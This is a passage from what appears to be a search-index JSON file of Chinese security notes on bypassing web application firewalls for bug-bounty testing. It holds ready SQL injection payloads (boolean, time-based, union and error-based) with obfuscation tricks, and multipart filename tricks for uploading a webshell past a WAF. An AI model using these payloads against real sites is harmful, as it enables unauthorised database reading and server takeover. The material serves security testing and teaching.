\u7cfb\u7edf\u654f\u611f\u6587\u4ef6\u8bfb\u53d6\u51fa\u6765","title":"\u601d\u8def\u65b9\u6cd5"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#_1","text":"\u4e3b\u8981\u9488\u5bf9SRC\u548c\u4f17\u6d4b\uff0c\u63a2\u8ba8\u81ea\u5df1\u7684\u65b9\u6cd5 \u600e\u4e48\u5206\u6790\uff0c\u600e\u4e48\u53bb\u7ed5\uff0c\u600e\u4e48\u53bb\u83b7\u53d6\u8bc1\u636e\uff0c\u7b49\u7b49","title":"\u524d\u8a00"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#_2","text":"\u8d8a\u6765\u8d8a\u591a\u7684web\u7cfb\u7edf\uff0c\u968f\u7740\u8fd0\u7ef4\u65b9\u5b89\u5168\u610f\u8bc6\u7684\u63d0\u9ad8\uff0c\u7f51\u7edc\u8bbe\u5907\u7684\u6295\u5165\uff0c \u4ee5\u53ca\u5b89\u5168\u7f16\u7801\u89c4\u8303\u7684\u4ecb\u5165\uff0c\u6f0f\u6d1e\u7684\u53d1\u73b0\u4ece\u8fc7\u53bb\u7684\u7b80\u5355\u7c97\u66b4\uff0c\u5230\u73b0\u5728\u4e3e\u6b65 \u7ef4\u8270\uff0c\u600e\u4e48\u53bb\u5224\u65ad\u6f0f\u6d1e\u7684\u5b58\u5728\uff0c\u8fdb\u800c\u6839\u636e\u6f0f\u6d1e\u83b7\u53d6\u8bc1\u636e\u6570\u636e\uff0c\u8fd9\u4e2a\u662f\u4e2a \u4f17\u6d4b\u5e73\u53f0\u9009\u624b\u7684\u75db\u70b9","title":"\u4e00\u3001\u62e6\u622a\u6846\u67b6\u4e0b\u6ce8\u5165\u7684\u8fc7\u7a0b\u62c6\u89e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#1","text":"\u5224\u65ad\u6027SQL\u8bed\u53e5\u7684\u5f62\u5f0f \u6761\u4ef6\u5224\u65ad\u51fd\u6570\u65b9\u6cd5\u5206\u6790 mysql if ( 1 = ( select 1 REGEXP if ( 1 = 1 , 1 , 0x00 )), 1 , 1 ) = 1 IFNULL ( ascii ( substr ( user (), 1 , 1 )) / ( 114 % ascii ( substr ( user (), 1 , 1 ))), 'yes\u2019) IFNULL(hex(substr(user(),1,1))/(114%hex(substr(user(),1,1))),' yes\u2019 ) IFNULL ( 1 / ( locate ( substr ( user (), 1 , 1 ), 'r' )), 'yes\u2019) IFNULL(1/(locate(right(left(lower(user()),1),1),' r ')),' yes\u2019 ) left ( user (), 1 ) = \"r\" ; if ( 1 = 1 , 1 , 1 ) oracle NVL ( TO_CHAR ( DBMS_XMLGEN . getxml ( 'select 1 from dual where 1337>1' )), '1' ) != 1 NVL2 ( NULLIF ( substr ( 'abc' , 1 , 1 ), 'ca' ), 1 , 2 ) = 1 INSTR ( 'abcd' , 'b' , 2 , 1 ) > 0 2018 - 10 - 21 \u2019 - decode ( 1 , 21 , 1 , to_date ( decode ( 1 , 1 , '' , 's' ), 'yyyy -mm-dd' )) - \u2019 to_date ( decode ( substr ( user , 1 , 1 ), 'a' , '' , 's' ), 'yyyy-mm-dd\u2019)) decode(sign(INSTR(USER,' A ', 2, 1)),0,to_number(' x ' ), 1 ) sqlserver PATINDEX ( 'Wa%25' , 'Washington' ) > 0 right ( left ( lower ( 'abc' ), 1 ), 1 ) = 'a\u2019 isnull(nullif(substring(' abc ',1,1),' a '),' c ')=' c ' regexp_like ( 1 ,( case when 1 = 1 then 1 else 0 x00end )) \u901a\u7528\u578b\u5224\u65adSQL\u8bed\u53e5","title":"1.\u6570\u636e\u5e93\u5c42\u9762\u57fa\u7840\u94fa\u57ab"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#2waf","text":"","title":"2.\u5c42\u5c42\u9012\u8fdb\u5206\u6790WAF\u6c42\u8bc1\u636e"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#waf","text":"WAF\u7684\u53d1\u5c55\u4e3b\u8981\u7ecf\u5386\u4e86IPS\u67b6\u6784\uff0c \u53cd\u5411\u4ee3\u7406 \uff0c\u900f\u660e\u4ee3\u7406\u548c\u6d41\u6a21\u5f0f\u3002","title":"waf\u7684\u539f\u7406"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#waf_1","text":"WAF\u900f\u660e\u4ee3\u7406\u6280\u672f\u539f\u7406 waf\u901a\u4fe1 WAF\u4e3b\u8981\u4f1a\u66f4\u6539\u5982\u4e0b\u6570\u636e\u5305\u5185\u5bb9\u9879\uff1a \u5ba2\u6237\u7aefTCP\u6e90\u7aef\u53e3 \u5ba2\u6237\u7aef\u6e90MAC/\u670d\u52a1\u5668\u6e90MAC\u5730\u5740 \u957f\u77ed\u8fde\u63a5\u534f\u8bae\u7248\u672c MIME\u7c7b\u578b","title":"WAF\u5173\u952e\u6280\u672f"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#waf_2","text":"","title":"waf\u7684\u8bc6\u522b"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#cookie","text":"Citrix Netscaler\uff082013\u5e74\u4f7f\u7528\u5e7f\u6cdb\uff09 Citrix Netscaler\u201d\u4f1a\u5728HTTP\u8fd4\u56de\u5934\u90e8Cookie\u4f4d\u7f6e\u52a0\u5165\u201cns_af\u201d\u7684\u503c\uff0c\u53ef\u4ee5\u4ee5\u6b64\u5224\u65ad\u4e3aCitrix Netscaler\u7684WAF\uff0c\u56fd\u5185\u6b64\u7c7bWAF\u5f88\u5c11 F5 BIG IP ASM F5 BiG IP ASM\u4f1a\u5728Cookie\u4e2d\u52a0\u5165\u201cTS+\u968f\u673a\u5b57\u7b26\u4e32\u201d\u7684Cookie\u4fe1\u606f\uff0c","title":"\u57fa\u4e8eCookie\u503c"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#http","text":"Mod_Security Mod_Security\u662f\u4e3aApache\u8bbe\u8ba1\u7684\u5f00\u6e90Web\u9632\u62a4\u6a21\u5757\uff0c\u4e00\u4e2a\u6076\u610f\u7684\u8bf7\u6c42Mod_Security\u4f1a\u5728\u54cd\u5e94\u5934\u8fd4\u56de\u201c406 Not acceptable\u201d WebKnight WebKnight\u662f\u7528\u6765\u8bbe\u8ba1\u5728IIS\u4e0b\u9762\u4f7f\u7528\u7684WAF\u8bbe\u5907\uff0c\u8f83\u4e3a\u5e38\u89c1\u3002WebKnight\u4f1a\u5bf9\u6076\u610f\u7684\u8bf7\u6c42\u8fd4\u56de\u201c999 No Hacking\u201d F5 BIG IP F5 BIG IP\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201c419 Unknown\u201d\u7684\u4fe1\u606f dotDefender dotDefender\u7528\u6765\u9632\u62a4.net\u7684\u7a0b\u5e8f\uff0c\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201cdotDefender Blocked Your Request\u201d","title":"\u57fa\u4e8eHTTP\u54cd\u5e94"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#_3","text":"\u90e8\u5206\u7279\u5b9aWAF\u5728\u8fd4\u56de\u7684\u544a\u8b66\u9875\u9762\u542b\u7279\u5b9a\u7684CSS\u6216\u8005JS\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u5224\u65ad\u7684\u4f9d\u636e\uff0c\u8fd9\u7c7b\u60c5\u51b5\u5728WAF\u7c7b\u91cc\u6bd4\u8f83\u5c11\uff0c\u53ef\u5f52\u5e76\u5230HTTP\u54cd\u5e94\u4e2d\u3002 Sqlmap\u4e2dWaf\u68c0\u6d4b\u65b9\u6cd5\uff0881\u79cd\uff0c\u5305\u62ec360\uff0c\u5b89\u5168\u72d7\uff0csafe3\uff0c\u4e91\u9501\uff09 sqlmap . py - u \u201c http : // www . xxx . com \u201d -- identify - waf -- batch","title":"\u7279\u5b9a\u8d44\u6e90\u6587\u4ef6"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#waf_3","text":"","title":"\u5168\u5c40\u8fc7waf\u7684\u51e0\u4e2a\u601d\u8003\u70b9"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#1-waf","text":"","title":"1. \u67b6\u6784\u5c42\u7ed5\u8fc7WAF"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#11","text":"\u4fe1\u606f\u6cc4\u9732\u53d1\u73b0\u6e90\u7ad9IP \u601d\u8def\u592a\u591a\uff0c\u90ae\u4ef6 \u7a77\u4e3eIP\u5730\u5740 \u5b8c\u6210\u4e00\u6b21\u56fd\u5185IP\u626b\u63cf\u53ea\u9700\u89818-9\u5c0f\u65f6","title":"1.1\u5bfb\u627e\u6e90\u7ad9"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#12","text":"\u4e91\u670d\u52a1\u5546\u4e70\u4e00\u53f0VPS\uff0c\u901a\u8fc7VPS\u653b\u51fb\u76ee\u6807\u7ad9\u70b9\uff0c\u56e0\u4e3a\u6d41\u91cf\u662f\u5c40\u57df\u7f51\uff0c\u53ef\u80fd\u4e0d\u7ecf\u8fc7WAF\u68c0\u6d4b\uff0c\u5b9e\u73b0\u7ed5\u8fc7","title":"1.2\u5229\u7528\u540c\u7f51\u6bb5"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#13","text":"\u5bfb\u627e\u5b50\u7ad9\u7684SSRF\u6f0f\u6d1e\u3002\u5982\u679c\u5b50\u7ad9\u8bbf\u95ee\u76ee\u6807\u7ad9\u4e0d\u7ecf\u8fc7WAF\u96c6\u7fa4\uff0c\u53ef\u4ee5\u5229\u7528SSRF\u6f0f\u6d1e\u6765\u7ed5\u8fc7WAF","title":"1.3\u5229\u7528\u8fb9\u754c\u6f0f\u6d1e"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#2-waf","text":"WAF\u53ea\u68c0\u6d4b\u524d\u9762\u7684\u51e0K\u5b57\u8282\u30011M\u3001\u62162M\uff0c\u53ea\u9700\u8981\u5728POST BODY\u524d\u9762\u6dfb\u52a0\u8bb8\u591a\u65e0\u7528\u6570\u636e\uff0c\u628a\u653b\u51fbpayload\u653e\u5728\u6700\u540e\u5373\u53ef\u7ed5\u8fc7WAF\u68c0\u6d4b","title":"2. \u8d44\u6e90\u9650\u5236\u89d2\u5ea6\u7ed5\u8fc7WAF"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#3-waf","text":"","title":"3 \u534f\u8bae\u5c42\u9762\u7ed5\u8fc7WAF\u7684\u68c0\u6d4b"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#31","text":"Waf\u672a\u80fd\u8986\u76d6Content-Type: multipart/form-data\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u6216\u8005WAF\u4f1a\u8ba4\u4e3a\u5b83\u662f\u6587\u4ef6\u4e0a\u4f20\u8bf7\u6c42\uff0c\u4ece\u800c\u53ea\u68c0\u6d4b\u6587\u4ef6\u4e0a\u4f20\uff0c\u5bfc\u81f4\u88ab\u7ed5\u8fc7","title":"3.1\u534f\u8bae\u8986\u76d6\u4e0d\u5168"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#32","text":"\u4f8b\u5982\u6587\u4ef6\u4e0a\u4f20\uff0c\u4e0a\u4f20\u6587\u4ef6\u540d\u7684\u4fee\u6539test.jpg/shell.php","title":"3.2\u534f\u8bae\u89e3\u6790\u4e0d\u6b63\u786e"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#33web","text":"\u6587\u4ef6\u540d\u8986\u76d6 \u5728multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u5757\u5b58\u5728\u591a\u4e2aContent-Disposition\uff0c\u5c06\u4ee5\u6700\u540e\u4e00\u4e2aContent-Disposition\u7684filename\u503c\u4f5c\u4e3a\u4e0a\u4f20\u7684\u6587\u4ef6\u540d \u7b2c\u4e00\u4e2a\u6587\u4ef6\u540dshell.123 \u7b2c\u4e8c\u4e2ashell.php \u4e0a\u4f20\u540e\u662fshell.php Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\"\" Content-Disposition: form-data;name=\"myfile\"; filename=\"t3.jsp\" \u5728\u4e00\u4e2aContent-Disposition \u4e2d\uff0c\u5b58\u5728\u591a\u4e2afilename Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\";filename=\"t3.jsp\" \u9057\u6f0f\u6587\u4ef6\u540d \u5f53WAF\u9047\u5230\u201cname=\u201dmyfile\";;\u201d\u65f6\uff0c\u8ba4\u4e3a\u6ca1\u6709\u89e3\u6790\u5230filename\u3002\u800c\u540e\u7aef\u5bb9\u5668\u7ee7\u7eed\u89e3\u6790\u5230\u7684\u6587\u4ef6\u540d\u662ft3.jsp Content-Disposition: form-data;name=\"myfile\";; filename=\"t3.jsp\"\u3002 \u672a\u89e3\u6790\u6240\u6709\u6587\u4ef6 multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2aPOST\u8bf7\u6c42\u53ef\u4ee5\u540c\u65f6\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u3002\u5982\u56fe\uff0c\u8bb8\u591aWAF\u53ea\u68c0\u67e5\u7b2c\u4e00\u4e2a\u4e0a\u4f20\u6587\u4ef6\uff0c\u6ca1\u6709\u68c0\u67e5\u4e0a\u4f20\u7684\u6240\u6709\u6587\u4ef6\uff0c\u800c\u5b9e\u9645\u540e\u7aef\u5bb9\u5668\u4f1a\u89e3\u6790\u6240\u6709\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\uff0c\u653b\u51fb\u8005\u53ea\u9700\u628apaylaod\u653e\u5728\u540e\u9762\u7684\u6587\u4ef6PART \u6587\u4ef6\u540d\u89e3\u6790\u517c\u5bb9\u6027 multipart\u534f\u8bae\u4e2d\uff0c\u6587\u4ef6\u540d\u7684\u5f62\u5f0f\u4e3a\u201cfilename=\"abc.php\"\u201d\u3002\u4f46\u662fTomcat\u3001PHP\u7b49\u5bb9\u5668\u89e3\u6790\u534f\u8bae\u65f6\u4f1a\u505a\u4e00\u4e9b\u517c\u5bb9\uff0c\u80fd\u6b63\u786e\u89e3\u6790 \u201dfilename=\"abc.php\u201d\u3001\u201dfilename=abc.php\u201d\u3001 \u201dfilename='abc.php\u2019\u201d\u3002\u800cWAF\u53ea\u6309\u7167\u534f\u8bae\u6807\u51c6\u53bb\u89e3\u6790\uff0c\u65e0\u6cd5\u89e3\u6790\u6587\u4ef6\u540d\uff0c\u4f46\u662f\u540e\u7aef\u5bb9\u5668\u80fd\u6b63\u786e\u83b7\u5f97\u6587\u4ef6\u540d\uff0c\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u573a\u666f\u7684\u7ed5\u8fc7\u5f62\u5f0f\uff1a Content-Disposition: form-data; name=\"file\"; filename=abc.php Content-Disposition: form-data; name=\"file\"; filename=\"abc.php Content-Disposition: form-data; name=\"file\"; filename='abc.php\u2019 3.4\u53c2\u6570\u6c61\u67d3 \u8bf7\u6c42\u4e2d\u5305\u542b2\u4e2a\u53c2\u6570\u540d\u76f8\u540c\u7684\u53c2\u6570typeid\uff0c\u7b2c\u4e00\u4e2a\u662f\u6b63\u5e38\u53c2\u6570\u7684\u503c\u6b63\u5e38\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u624d\u662fpayload\u3002\u5982\u679cWAF\u89e3\u6790\u53c2\u6570\u4f7f\u7528\u7b2c\u4e00\u4e2a\u503c\uff0c\u6ca1\u68c0\u67e5\u7b2c\u4e8c\u4e2a\u503c\uff0c\u5c06\u5bfc\u81f4\u7ed5\u8fc7\u3002\u8fd9\u662f\u5f88\u4e45\u5f88\u4e45\u7684\u4e00\u4e2aCASE\uff0c\u73b0\u5728\u51e0\u4e4e\u6ca1\u6709WAF\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898\u3002 /forum.php\uff1f typeid=644&typeid=if(now()%3dsysdate()%2csleep(19.844)%2c0)/ 'XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR%22 /","title":"3.3\u534f\u8bae\u89e3\u6790\u4e0e\u540eWEB\u5bb9\u5668\u7684\u534f\u8bae\u89e3\u6790\u4e0d\u4e00\u81f4"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#4","text":"\u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u7ed5\u8fc7WAF\u89c4\u5219\u4e3b\u8981\u601d\u8003\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\u5728\u60f3\u4ec0\u4e48\uff0c\u5bb9\u6613\u5ffd\u7565\u4ec0\u4e48\uff0c\u63a8\u65ad\u4e00\u4e9b\u53ef\u80fd\u7ed5\u8fc7\u7684\u65b9\u5f0f\uff0c\u7136\u540e\u591a\u6b21\u5c1d\u8bd5\u8fdb\u884c\u9a8c\u8bc1\u3002\u96b6\u5c5e\u4e8e\u6f0f\u6d1e\u5c42\u9762\u8fc7waf","title":"4. \u89c4\u5219\u5c42\u9762\u7684\u7ed5\u8fc7"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#41-sql","text":"\u7ed5\u8fc7SQL\u6ce8\u5165\u89c4\u5219\u4e3b\u8981\u5229\u7528WAF\u89c4\u5219\u672c\u8eab\u7684\u95ee\u9898\u3001\u672a\u8003\u8651\u5230SQL\u8bed\u6cd5\u53d8\u5f62\u3001\u53ca\u540e\u7aef\u6570\u636e\u5e93SQL\u8bed\u53e5\u8bed\u6cd5\u7279\u6027 \u6ce8\u91ca\u7b26\u7ed5\u8fc7 / xxx /\u662f\u6ce8\u91ca\uff0c\u4e5f\u53ef\u4ee5\u5145\u5f53\u7a7a\u767d\u7b26\u3002\u56e0\u4e3a / /\u53ef\u4f7f\u5f97MySQL\u5bf9sql\u8bed\u53e5(union/ /select)\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u3002\u4e8b\u5b9e\u4e0a\u8bb8\u591aWAF\u90fd\u8003\u8651\u5230/**/\u53ef\u4ee5\u4f5c\u4e3a\u7a7a\u767d\u5206\uff0c\u4f46\u662fwaf\u68c0\u6d4b \u201c/*. */\u201d\u5f88\u6d88\u8017\u6027\u80fd\uff0c\u5de5\u7a0b\u5e08\u4f1a\u6298\u4e2d\uff0c\u53ef\u80fd\u5728\u68c0\u6d4b\u4e2d\u95f4\u5f15\u5165\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\uff0c\u4f8b\u5982\uff1a/ \\w+*/\u3002\u6216\u8005\uff0cWAF\u53ef\u80fd\u53ea\u4e2d\u95f4\u68c0\u67e5n\u4e2a\u5b57\u7b26\u201c/*.{,n}*/\u201d\u3002\u6839\u636e\u4ee5\u4e0a\u60f3\u6cd5\uff0c\u53ef\u4ee5\u9010\u6b65\u6d4b\u8bd5\u7ed5\u8fc7\u65b9\u6cd5\uff1a \u5148\u6d4b\u8bd5\u6700\u57fa\u672c\u7684\uff1aunion/**/select \u518d\u6d4b\u8bd5\u4e2d\u95f4\u5f15\u5165\u7279\u6b8a\u5b57\uff1aunion/ aaaa%01bbs /select \u6700\u540e\u6d4b\u8bd5\u6ce8\u91ca\u957f\u5ea6\uff1aunion/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /select \u540c\u7406\uff0c\u5bf9\u4e8e/ !xxx /\uff0c\u53ef\u4ee5\u91c7\u53d6\u7c7b\u4f3c\u7684\u601d\u8def\u7ed5\u8fc7WAF\u3002 \u7a7a\u767d\u7b26\u7ed5\u8fc7 \u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c SQL\u6ce8\u5165\u89c4\u5219\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u201c\\s\u201d\u5339\u914d\u7a7a\u683c\uff0c\u4f8b\u5982\u201dselect\\s+union\u201d\u3002\u5229\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u7a7a\u767d\u7b26\u4e0eMySQL\u7a7a\u767d\u7b26\u7684\u4e0d\u540c\u53ef\u7ed5\u8fc7WAF\u89c4\u5219\u3002\u5982\u4f55\u8fd9\u4e9bMySQL\u7684\u7279\u6027\uff1f\u901a\u8fc7fuzz,\u6bcf\u6b21\u66f4\u6539\u6b63\u5e38SQL\u8bed\u53e5\u7684\u67d0\u90e8\u5206\uff0c\u66ff\u6362\u4e3a\u5176\u4ed6\u5b57\u7b26\uff0c\u5224\u65ad\u8bed\u6cd5\u662f\u5426\u6b63\u786e\uff0c\u5373\u53ef\u5224\u65ad\u51fa\u6765MySQL\u8bed\u6cd5\u7279\u6027\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5206\u6790MySQL\u8bcd\u6cd5\u6765\u53d1\u73b0\u8bed\u6cd5\u7279\u6027\uff0c\u4ece\u800c\u627e\u5230\u7ed5\u8fc7\u65b9\u6cd5\u3002 \u5229\u7528\u7a7a\u767d\u7b26\u8fdb\u884c\u7ed5\u8fc7\uff0c\u6d4b\u8bd5WAF\u65f6\u5c3d\u53ef\u80fd\u51cf\u5c11\u5176\u4ed6\u539f\u56e0\u7684\u5f71\u54cd\uff0c\u4f8b\u5982\u201dunion select\u201d\u88ab\u62e6\u622a\uff0c\u53ea\u9700\u628a\u4e2d\u95f4\u7a7a\u767d\u7b26\u66ff\u6362\u4e3a\u201d%250C\u201d, \u201c%25A0\u201d\u8fdb\u884c\u7ed5\u8fc7\u6d4b\u8bd5\u3002 union%250Cselect union%25A0select \u51fd\u6570\u5206\u9694\u7b26 \u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u6211\u4eec\u731c\u6d4b\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\uff0c\u53ef\u80fd\u4e0d\u77e5\u9053\u51fd\u6570\u540d\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\uff0c\u6216\u8005\u9057\u6f0f\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\u3002\u4f8b\u5982\u5339\u914d\u51fd\u6570\u201dconcat()\u201d\u7684\u89c4\u5219\u5199\u6cd5\uff0c\u201cconcat(\u201d\u6216\u8005\u201dconcat\\s*(\u201d\uff0c\u5c31\u6ca1\u6709\u8003\u8651\u5230\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u3002\u76f8\u5e94\u7684\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u5728\u7279\u6b8a\u4f4d\u7f6e\u5f15\u5165\u7279\u6b8a\u7684\u5206\u9694\u7b26\uff0c\u9010\u4e2a\u6d4b\u8bd5\u3002\u8fd9\u4e9b\u7279\u6b8a\u5206\u9694\u7b26\u53d1\u73b0\u4e5f\u662f\u901a\u8fc7Fuzz\u51fa\u6765\u7684\u3002 concat%2520( concat/**/( concat%250c( concat%25a0( \u4e3e\u4e00\u53cd\u4e09\uff0c\u5bfb\u627e\u7c7b\u4f3c\u7684\u5173\u952e\u4f4d\u7f6e\uff0cFuzz\u7279\u6b8a\u5b57\u7b26\uff0c\u53d1\u73b0\u66f4\u591a\u7684\u7ed5\u8fc7\u65b0\u65b9\u6cd5\u3002\u731c\u6d4b\u5de5\u7a0b\u5e08\u4eec\u5199\u89c4\u5219\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u5bb9\u6613\u9057\u6f0f\u7684\u70b9\uff0c\u8fdb\u884c\u7ed5\u8fc7WAF\u68c0\u6d4b\u3002 \u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790 \u5229\u7528MySQL\u89e3\u6790\u6d6e\u70b9\u6570\u7684\u7279\u70b9\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u65e0\u6cd5\u5339\u914d\u51fa\u5355\u8bcdunion\uff0c\u4f46\u662fMySQL\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u89e3\u6790\u51fa\u6d6e\u70b9\u6570\u3001sql\u5173\u952e\u5b57union\u3002 select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=\\Nunion select 1,2,3,4,5,6,7,8,9,0 \u5229\u7528error-based\u8fdb\u884cSQL\u6ce8\u5165 Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u975e\u5e38\u5bb9\u6613\u88ab\u5ffd\u7565\uff0c\u5bfc\u81f4WAF\u89c4\u5219\u8fc7\u6ee4\u4e0d\u5b8c\u6574\u3002\u968f\u7740\u5bf9MySQL\u7814\u7a76\u8d8a\u6765\u8d8a\u6df1\uff0c\u88ab\u53d1\u73b0\u53ef\u7528\u4e8eerror-based SQL\u6ce8\u5165\u7684\u51fd\u6570\u8d8a\u6765\u8d8a\u591a\uff0c\u540c\u65f6\u4e5f\u7ed9\u7ed5\u8fc7WAF\u9020\u5c31\u4e86\u66f4\u591a\u673a\u4f1a\u3002\u5e38\u89c1\u7684\u51fd\u6570\uff1a extractvalue(1, concat(0x5c,md5(3))); updatexml(1, concat(0x5d,md5(3)),1); GeometryCollection((select*from(select*from(select@@version)f)x)) polygon((select*from(select name_const(version(),1))x)) linestring() multipoint() multilinestring() multipolygon() \u5229\u7528Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u8fdb\u884c\u7ed5\u8fc7\u65f6\uff0c\u53ef\u4ee5\u7ed3\u5408\u51fd\u6570\u5206\u9694\u7b26\uff0c\u6216\u5176\u4ed6\u65b9\u6cd5\u7075\u6d3b\u8fd0\u7528\u3002 Mysql\u7279\u6b8a\u8bed\u6cd5 \u6700\u6709\u6548\u7684\u53d1\u73b0\u624b\u6bb5\uff0c\u8fd8\u662f\u53bb\u8bfb\u8bfbMySQL\u8bcd\u6cd5\u5206\u6790\u6e90\u4ee3\u7801\u3002\u548c\u534f\u8bae\u7ed5\u8fc7\u7c7b\u4f3c\uff0c\u6316\u6398SQL\u6807\u51c6\u4e0eMySQL\u7684\u8bcd\u6cd5\u5206\u6790\u5dee\u5f02\u662f\u53d1\u73b0WAF SQL\u6ce8\u5165\u7ed5\u8fc7\u7684\u6709\u6548\u624b\u6bb5\u3002\u4ee5\u4e0b\u662fMySQL\u8bed\u6cd5\u7684\u4e00\u4e2a\u7279\u5199(ps:\u4e0d\u662f\u6211\u53d1\u73b0\u7684)\uff1a select{x table_name}from{x information_schema.tables}; \u7efc\u5408\u5229\u7528\u5b9e\u4f8b \u4ee5\u4e0a\u90fd\u662fSQL\u6ce8\u5165\u7ed5\u8fc7\u4e2d\u7684\u6280\u672f\u70b9\uff0c\u5728\u5b9e\u9645\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u9700\u8981\u7075\u6d3b\u7efc\u5408\u5229\u7528\u624d\u80fd\u8fbe\u5230\u5b8c\u6574\u7ed5\u8fc7\uff0c\u8bfb\u53d6\u6570\u636e\u6570\u636e\u3002\u4ee5\u4e0b\u7ed9\u51fa\u5b8c\u6574\u7ed5\u8fc7WAF SQ\u6ce8\u5165\u68c0\u6d4b\u7684\u5b9e\u4f8b\u3002\u5982\u56fe\uff0c\u672c\u4f8b\u4e2d\u7efc\u5408\u591a\u4e2a\u7ed5\u8fc7\u6280\u672f\u70b9\uff0c\u6700\u7ec8\u5b9e\u73b0\u5b8c\u6574\u7ed5\u8fc7\u5b9e\u73b0\u8bfb\u53d6\u6570\u636e\u3002 \u5229\u7528\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7union select 